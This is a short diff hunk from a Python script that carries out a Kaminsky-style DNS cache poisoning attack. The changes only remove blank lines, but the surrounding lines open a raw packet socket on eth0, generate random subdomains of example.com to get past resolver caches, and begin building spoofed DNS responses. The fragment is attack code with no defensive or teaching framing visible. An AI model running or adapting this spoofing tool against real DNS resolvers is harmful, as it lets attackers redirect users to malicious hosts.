@@ -16,13 +16,10 @@ s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
 s.bind(("eth0", 0))
 
 while True:
-    
     count+=1
     print("[*] 3. Generating random subdomain for cache evasion...")
     random_prefix = ''.join([random.choice(string.ascii_lowercase) for _ in range(6)])
     domain = "{}.example.com".format(random_prefix)
-
-
 
     print("[*] 4. Building the spoofed Kaminsky responses...")
     base_pkt = (
